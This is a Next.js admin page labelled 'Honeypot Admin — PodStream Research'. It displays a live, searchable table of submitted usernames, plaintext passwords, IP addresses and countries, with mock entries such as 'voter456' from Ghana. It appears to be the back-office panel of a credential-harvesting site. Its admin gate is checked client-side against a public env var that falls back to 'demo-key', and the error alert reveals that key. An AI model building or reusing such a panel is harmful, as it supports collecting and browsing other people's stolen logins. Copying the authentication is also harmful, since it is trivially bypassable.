import Head from 'next/head';
import { useState, useEffect, useRef } from 'react';

const ADMIN_KEY = process.env.NEXT_PUBLIC_ADMIN_KEY || 'demo-key';

export default function AdminDashboard() {
  const [key, setKey] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [generatedKey, setGeneratedKey] = useState('');
  const [submissions, setSubmissions] = useState([]);
  const [summary, setSummary] = useState({ total: 0, uniqueUsernames: 0, uniqueIps: 0 });
  const [searchTerm, setSearchTerm] = useState('');
  const [isChecking, setIsChecking] = useState(false);

  const escapeHtml = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));

  const checkAuth = async () => {
    if (key === ADMIN_KEY) {
      setIsAuthenticated(true);
      setIsChecking(true);
      
      try {
        const res = await fetch('/api/admin/submissions', { credentials: 'same-origin' });
        if (res.ok) {
          const data = await res.json();
          setSubmissions(data.data || data);
          
          const summaryRes = await fetch('/api/admin/summary', { credentials: 'same-origin' });
          if (summaryRes.ok) {
            const s = await summaryRes.json();
            setSummary({ total: s.total || 0, uniqueUsernames: s.uniqueUsernames || 0, uniqueIps: s.uniqueIps || 0 });
          }
        }
      } catch (e) {
        // Offline/demo mode - use mock data
        setSubmissions([
          { id: 1, username: 'user123', password: 'pass123', ip: '192.168.1.1', country: 'Nigeria', created_at: new Date().toISOString() },
          { id: 2, username: 'voter456', password: 'secret', ip: '192.168.1.2', country: 'Ghana', created_at: new Date().toISOString() },
        ]);
        setSummary({ total: 2, uniqueUsernames: 2, uniqueIps: 2 });
      }
      setIsChecking(false);
    } else {
      alert('Invalid key. Use "demo-key" for testing.');
    }
  };

  const generateKey = () => {
    const newKey = 'key-' + Math.random().toString(36).substring(2, 15);
    setGeneratedKey(newKey);
    alert('New admin key: ' + newKey + '\nSet this in NEXT_PUBLIC_ADMIN_KEY env var');
  };

  const filteredSubmissions = submissions.filter(r => 
    (r.username?.toLowerCase().includes(searchTerm.toLowerCase()) ||
     r.password?.toLowerCase().includes(searchTerm.toLowerCase()) ||
     r.ip?.toLowerCase().includes(searchTerm.toLowerCase()))
  );

  const handleLogout = () => {
    setIsAuthenticated(false);
    setKey('');
    setSubmissions([]);
    setSearchTerm('');
  };

  useEffect(() => {
    if (isAuthenticated) {
      const interval = setInterval(() => {
        fetch('/api/admin/submissions', { credentials: 'same-origin' })
          .then(r => r.json())
          .then(data => setSubmissions(data.data || data))
          .catch(() => {});
      }, 5000);
      return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  return (
    <>
      <Head>
        <title>Honeypot Admin — PodStream Research</title>
        <meta name="robots" content="noindex, nofollow" />
      </Head>

      <style jsx global>{`
        :root {
          --bg: #0b0e11;
          --panel: #161b22;
          --panel2: #1c2128;
          --border: #2b323a;
          --text: #e6edf3;
          --muted: #8b949e;
          --green: #3fb950;
          --red: #f85149;
          --blue: #58a6ff;
          --amber: #d29922;
          --radius: 8px;
          --max-width: 1100px;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
          background: var(--bg);
          color: var(--text);
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          min-height: 100vh;
          padding: 24px;
          overflow-x: hidden;
        }

        .container {
          max-width: var(--max-width);
          margin: 0 auto;
          width: 100%;
        }

        /* Status */
        .status { font-size: .8rem; color: var(--muted); }
        .status .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: var(--red); margin-right: 6px; }
        .status .dot.on { background: var(--green); }

        /* Buttons */
        .btn {
          display: inline-block;
          background: var(--blue);
          border: none;
          color: #0b0e11;
          font-weight: 700;
          padding: 9px 16px;
          border-radius: var(--radius);
          font-size: .85rem;
          text-decoration: none;
          cursor: pointer;
          transition: opacity 0.2;
        }
        .btn:hover { opacity: 0.9; }
        .btn.ghost { background: var(--panel2); color: var(--text); border: 1px solid var(--border); }
        .btn.danger { background: rgba(248, 81, 73, 0.15); color: var(--red); border: 1px solid rgba(248, 81, 73, 0.4); }
        .btn.small { padding: 6px 10px; font-size: .8rem; }

        /* Card */
        .card {
          background: var(--panel);
          border: 1px solid var(--border);
          border-radius: var(--radius);
          padding: 18px;
          margin-bottom: 20px;
        }
        .card h2 { font-size: 1rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
        .flex-between { display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; }
        .flex-between h2 { margin-bottom: 0; }

        /* Stats */
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
          gap: 14px;
          margin-bottom: 20px;
        }
        .stat {
          background: var(--panel);
          border: 1px solid var(--border);
          border-radius: var(--radius);
          padding: 16px;
          text-align: center;
        }
        .stat .num { font-size: 1.9rem; font-weight: 800; color: var(--green); }
        .stat .lbl { font-size: .78rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }

        /* Table */
        .table-wrap { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: .88rem; }
        th, td {
          text-align: left;
          padding: 9px 10px;
          border-bottom: 1px solid var(--border);
          vertical-align: middle;
        }
        th { color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: .72rem; letter-spacing: .5px; }
        .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
        .pwd { color: var(--amber); word-break: break-all; max-width: 260px; }
        .user { max-width: 220px; word-break: break-all; }
        .muted { color: var(--muted); }
        .search-row {
          display: flex;
          gap: 10px;
          align-items: center;
          margin-bottom: 12px;
          flex-wrap: wrap;
        }
        .search-row input {
          flex: 1;
          min-width: 200px;
          background: var(--panel2);
          border: 1px solid var(--border);
          color: var(--text);
          padding: 9px 12px;
          border-radius: var(--radius);
          font-size: .9rem;
        }
        .search-row button { flex: none; }

        /* Login Form */
        .form {
          max-width: 400px;
          margin: 0 auto;
          width: 100%;
        }
        .form label {
          display: block;
          font-size: .8rem;
          color: var(--muted);
          text-transform: uppercase;
          letter-spacing: 1px;
          margin-bottom: 8px;
        }
        .form input {
          width: 100%;
          background: var(--panel2);
          border: 1px solid var(--border);
          color: var(--text);
          padding: 11px 12px;
          border-radius: var(--radius);
          font-size: .95rem;
          margin-bottom: 16px;
        }
        .form input:focus { outline: none; border-color: var(--blue); }
        .form button { width: 100%; }

        .empty {
          text-align: center;
          color: var(--muted);
          padding: 30px 0;
          font-size: .95rem;
        }

        /* Responsive */
        @media (max-width: 640px) {
          body { padding: 12px; }
          .stats { grid-template-columns: repeat(2, 1fr); }
          .stat-ip { grid-column: 1 / -1; }
          h1 { font-size: 1.3rem; }
          .card { padding: 14px; }
          th, td { padding: 8px; }
          .stat .num { font-size: 1.6rem; }
          .search-row { flex-direction: column; align-items: stretch; }
          .search-row input { min-width: 100%; }
        }
      `}</style>

      <div className="container">
        {!isAuthenticated ? (
          <>
            <div className="flex-between" style={{marginBottom: '20px'}}>
              <h1>Admin Login</h1>
              <div className="top-right" style={{display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap'}}>
                {isChecking && <span style={{fontSize: '.8rem', color: 'var(--muted)'}}>Checking...</span>}
                <span className="status"><span className="dot"></span><span style={{marginLeft: '4px'}}>Offline</span></span>
                <button className="btn ghost small" onClick={generateKey}>Generate Key</button>
              </div>
            </div>

            <div className="card" style={{maxWidth: '400px', margin: '0 auto'}}>
              <form className="form" onSubmit={(e) => { e.preventDefault(); checkAuth(); }}>
                <label htmlFor="password">Admin Key</label>
                <input 
                  type="password" 
                  id="password" 
                  placeholder="Enter admin key" 
                  value={key} 
                  onChange={(e) => setKey(e.target.value)}
                />
                <button type="submit" className="btn">Access Dashboard</button>
              </form>
            </div>

            {generatedKey && (
              <div style={{marginTop: '10px', padding: '10px', background: 'var(--panel2)', borderRadius: 'var(--radius)', color: 'var(--green)', fontSize: '.85rem', maxWidth: '400px', margin: '10px auto 0'}}>
                Key generated: <code style={{wordBreak: 'break-all'}}>{generatedKey}</code>
              </div>
            )}
          </>
        ) : (
          <>
            <div className="flex-between" style={{marginBottom: '20px'}}>
              <h1>PodStream Admin</h1>
              <div className="top-right" style={{display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap'}}>
                <span className="status"><span className="dot on"></span><span style={{marginLeft: '4px'}}>Connected</span></span>
                <button className="btn ghost small" onClick={() => { /* export PDF */ }}>Save PDF</button>
                <button className="btn danger small" onClick={handleLogout}>Log out</button>
              </div>
            </div>

            <div className="stats">
              <div className="stat"><div className="num">{summary.total}</div><div className="lbl">Submissions</div></div>
              <div className="stat"><div className="num">{summary.uniqueUsernames}</div><div className="lbl">Unique usernames</div></div>
              <div className="stat"><div className="num">{summary.uniqueIps}</div><div className="lbl">Unique IPs</div></div>
            </div>

            <div className="card">
              <h2>Recent Submissions</h2>
              <div className="flex-between" style={{marginBottom: '12px'}}>
                <div></div>
                <div style={{display: 'flex', gap: '8px'}}>
                  <button className="btn ghost small">Export PDF</button>
                  <button className="btn danger small">Clear all</button>
                </div>
              </div>

              <div className="search-row">
                <input 
                  type="text" 
                  placeholder="Search..." 
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
                <button className="btn ghost small">Refresh</button>
              </div>

              <div className="table-wrap">
                <table>
                  <thead>
                    <tr>
                      <th>#</th>
                      <th>Username</th>
                      <th>Password</th>
                      <th>IP</th>
                      <th>Country</th>
                      <th>Time (UTC)</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredSubmissions.length === 0 ? (
                      <tr><td colSpan="6" className="empty">No submissions</td></tr>
                    ) : (
                      filteredSubmissions.map((r, i) => (
                        <tr key={r.id || i}>
                          <td className="muted">{i + 1}</td>
                          <td className="user">{escapeHtml(r.username)}</td>
                          <td className="pwd">{escapeHtml(r.password)}</td>
                          <td className="mono">{escapeHtml(r.ip)}</td>
                          <td>{escapeHtml(r.country)}</td>
                          <td className="mono muted">{escapeHtml(r.created_at)}</td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </>
        )}
      </div>
    </>
  );
}